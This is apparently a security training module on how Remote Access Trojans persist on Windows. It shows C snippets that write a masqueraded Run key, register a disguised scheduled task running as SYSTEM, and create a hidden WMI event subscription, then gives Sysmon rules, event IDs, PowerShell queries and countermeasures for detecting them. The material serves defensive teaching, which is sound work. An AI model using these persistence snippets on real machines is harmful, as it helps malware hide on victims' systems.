# Module 7: Remote Access Trojan (RAT) Persistence Mechanisms

## 1. Registry-Based Persistence — `Run` Key

The most ubiquitous persistence vector employed by Remote Access Trojans is the Windows Registry `Run` key. The following Win32 API sequence is characteristic:

```c
HKEY hKey;
LPCSTR lpSubKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
LSTATUS status = R**********xA(
    HKEY_CURRENT_USER,      // HKCU — current user scope
    lpSubKey,               // path to Run key
    0,                      // reserved, must be 0
    KEY_SET_VALUE,          // write access required
    &hKey                   // out: handle to opened key
);
if (status == ERROR_SUCCESS) {
    R**********xA(
        hKey,
        "WindowsUpdate",          // value name (masqueraded)
        0,                        // reserved
        REG_SZ,                   // string type
        (const BYTE*)"C:\\Users\\victim\\AppData\\Roaming\\svchost.exe",
        strlen(path) + 1
    );
    RegCloseKey(hKey);
}
```

**Mechanism:** The `Run` key under `HKEY_CURRENT_USER` (HKCU) causes the specified executable to launch each time the user logs in. RAT authors frequently choose HKCU over HKLM to avoid requiring administrator privileges and UAC elevation. The value name is often disguised as a legitimate Windows component (e.g., `WindowsUpdate`, `JavaUpdater`, `AdobeFlashHelper`).

**Variants:**
| Registry Path | Scope | Elevation Required |
|---|---|---|
| `HKCU\...\Run` | Current user only | No |
| `HKLM\...\Run` | All users | Yes (Admin) |
| `HKCU\...\RunOnce` | Single execution on next logon | No |
| `HKLM\...\RunOnce` | Single execution on next boot | Yes |
| `HKCU\...\RunServices` | Background services (legacy) | No |

## 2. Task Scheduler Persistence — `ITaskService` COM Interface

Modern RATs leverage the Windows Task Scheduler 2.0 API via the `ITaskService` COM interface, which provides greater flexibility and stealth than registry keys.

### COM Initialization Sequence

```c
// 1. Initialize COM
CoInitializeEx(NULL, COINIT_MULTITHREADED);

// 2. Create TaskService instance
ITaskService *pService = NULL;
CoCreateInstance(
    CLSID_TaskScheduler,       // {0F87369F-A4E5-4CFC-BD3E-73E6154572DD}
    NULL,
    CLSCTX_INPROC_SERVER,
    IID_ITaskService,          // schedules tasks
    (void**)&pService
);

// 3. Connect to local task scheduler
pService->Connect(_variant_t(NULL), _variant_t(NULL),
                  _variant_t(NULL), _variant_t(NULL));

// 4. Get root task folder
ITaskFolder *pRootFolder = NULL;
pService->GetFolder(_bstr_t("\\"), &pRootFolder);

// 5. Register the RAT binary as a scheduled task
IRegisteredTask *pTask = NULL;
pRootFolder->RegisterTaskDefinition(
    _bstr_t("MicrosoftEdgeUpdateTask"),   // disguised name
    pDefinition,                           // ITaskDefinition object
    TASK_CREATE_OR_UPDATE,
    _variant_t("SYSTEM"),                 // runs as SYSTEM
    _variant_t(NULL),                     // no password
    TASK_LOGON_SERVICE_ACCOUNT,
    _bstr_t(""),                          // sddl (empty = default)
    &pTask
);
```

### Trigger Configuration

RATs typically configure one or more of the following triggers:
- **Logon Trigger** (`TASK_TRIGGER_LOGON`) — executes upon user logon
- **Idle Trigger** (`TASK_TRIGGER_IDLE`) — executes after system idle period (evades detection during active use)
- **Daily Trigger** (`TASK_TRIGGER_DAILY`) — re-establishes persistence every N days
- **Boot Trigger** (`TASK_TRIGGER_BOOT`) — executes at system startup
- **Event Trigger** (`TASK_TRIGGER_EVENT`) — executes in response to a specific ETW event

## 3. WMI EventFilter Persistence

Windows Management Instrumentation (WMI) EventFilter persistence is among the most stealthy techniques, as it operates entirely within the WMI repository and does not write a traditional file reference in the registry Run keys or Task Scheduler XML.

### WMI Event Subscription Architecture

```
WMI EventFilter  ──────── filters ────────► WMI EventConsumer
       │                                            │
       │                                     ┌──────┴──────┐
       │                             ActiveScript   CommandLine
       │                             Consumer        Consumer
       ▼
__EventFilter object         __EventConsumer object
    (filter definition)          (action definition)
                                        │
                                        ▼
                              __FilterToConsumerBinding
                                    (link)
```

### Implementation via COM (IWbemServices)

```c
IWbemServices *pSvc = NULL;
// ... (connect to root\subscription namespace) ...

// Step 1: Create EventFilter
IWbemClassObject *pFilter = NULL;
pSvc->GetObject(L"__EventFilter", 0, NULL, &pFilter, NULL);
pFilter->Put(L"QueryLanguage", 0, &_variant_t(L"WQL"), 0);
pFilter->Put(L"Query", 0, &_variant_t(
    L"SELECT * FROM __InstanceModificationEvent WITHIN 60 "
    L"WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' "
    L"AND TargetInstance.SystemUpTime >= 240"
), 0);
pFilter->Put(L"Name", 0, &_variant_t(L"SystemHealthMonitor"), 0);
pFilter->Put(L"EventNamespace", 0, &_variant_t(L"root\\cimv2"), 0);

// Step 2: Create CommandLineEventConsumer
IWbemClassObject *pConsumer = NULL;
pSvc->GetObject(L"CommandLineEventConsumer", 0, NULL, &pConsumer, NULL);
pConsumer->Put(L"Name", 0, &_variant_t(L"SystemHealthConsumer"), 0);
pConsumer->Put(L"CommandLineTemplate", 0,
    &_variant_t(L"C:\\Windows\\system32\\rundll32.exe "
                L"C:\\Users\\victim\\AppData\\Roaming\\syshelper.dll,#1"), 0);
pConsumer->Put(L"ShowWindowCommand", 0, &_variant_t(0L), 0); // SW_HIDE

// Step 3: Bind filter to consumer
IWbemClassObject *pBinding = NULL;
pSvc->GetObject(L"__FilterToConsumerBinding", 0, NULL, &pBinding, NULL);
pBinding->Put(L"Filter", 0, &_variant_t(pFilter->GetObjectPath()), 0);
pBinding->Put(L"Consumer", 0, &_variant_t(pConsumer->GetObjectPath()), 0);
```

**Trigger Conditions (WQL Queries) Commonly Used by RATs:**
| WQL Query | Trigger Timing |
|---|---|
| `SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240` | 4 minutes after boot |
| `SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_LogonSession'` | On user logon |
| `SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'` | When Explorer starts |

## 4. Detection via Alternate Methods

### 4.1 Registry Monitoring (Sysmon Event ID 13)

`R**********xA` writes to `Run` keys generate Sysmon Event ID 13 (`RegistryEvent (Value Set)`). Detection rule:

```xml
<RuleGroup name="RAT Persistence Registry" groupRelation="or">
  <RegistryEvent onmatch="include">
    <TargetObject name="T1037.001">
    condition="contains">CurrentVersion\Run</TargetObject>
    <Image condition="contains">AppData\Roaming</Image>
  </RegistryEvent>
</RuleGroup>
```

### 4.2 Task Scheduler Audit (Event ID 106 / 4698)

- **Security Event 4698** (Windows Security Log): `A scheduled task was created.`
- **TaskScheduler Operational 106**: `Task created.`

Detection via EventLog filtering:
```
Security: 4698 AND TaskName CONTAINS "MicrosoftEdgeUpdate" OR "JavaUpdate"
```

### 4.3 WMI Subscription Detection

WMI persistence is invisible to most file-based scanners. Detection requires querying the WMI repository:

```powershell
# PowerShell — enumerate all permanent event subscriptions
Get-WMIObject -Namespace root\subscription -Class __EventFilter
Get-WMIObject -Namespace root\subscription -Class __EventConsumer
Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding

# Or using modern CIM cmdlets
Get-CimInstance -Namespace root/subscription -ClassName __EventFilter
Get-CimInstance -Namespace root/subscription -ClassName __EventConsumer
Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding
```

**Indicators of Suspicious WMI Subscriptions:**
- `CommandLineTemplate` containing encoded PowerShell, rundll32, or base64
- `Query` containing suspicious thresholds (e.g., `SystemUpTime >= 240` for delayed execution)
- Filter names mimicking legitimate services (e.g., `SystemHealthMonitor`, `WindowsTelemetryService`)
- Consumers pointing to binaries in user-writable directories (`AppData`, `Temp`, `Downloads`)

### 4.4 Autoruns Tool (Sysinternals)

Mark Russinovich's **Autoruns** is the gold-standard detection tool, enumerating:
- Registry `Run`, `RunOnce`, `RunServices` keys (Logon tab)
- Scheduled Tasks (Scheduled Tasks tab)
- WMI Event Subscriptions (WMI tab)
- Service Control Manager, Boot Execute, AppInit DLLs, and 18+ other locations

## 6. Defensive Countermeasures

| Vector | Prevention | Detection | Response |
|---|---|---|---|
| **Registry Run Keys** | Restrict `KEY_SET_VALUE` via AppLocker/SRM; Enable Registry Auditing | Sysmon EID 13; Autoruns Logon tab | Remove value; investigate parent process |
| **Task Scheduler** | Restrict `RegisterTaskDefinition` via SACL; Disable Task Scheduler if unused | Security EID 4698; Sysmon EID 1 (schtasks.exe) | Disable task; inspect task XML for `Command` |
| **WMI Subscriptions** | Disable WMI if not required; Restrict `root\subscription` namespace ACLs | PowerShell query (Get-WmiObject); WMI-Activity Operational EID 5861 | Remove filter/consumer/binding |

---

## 7. Summary

RAT persistence operates along a spectrum of complexity:

1. **Registry Run Keys** (T1547.001) — Simplest, most detected; uses `R**********xA` → `R**********xA`.
2. **Task Scheduler** (T1053.005) — Moderate complexity; uses `ITaskService` COM to register XML-defined tasks with flexible triggers.
3. **WMI Event Subscriptions** (T1546.003) — Most stealthy; lives entirely in the WMI repository; combines `__EventFilter`, `__EventConsumer`, and `__FilterToConsumerBinding`.

Detection strategies must evolve from simple file/registry scanning to active WMI repository interrogation, event log correlation, and behavioral analysis of process creation chains.
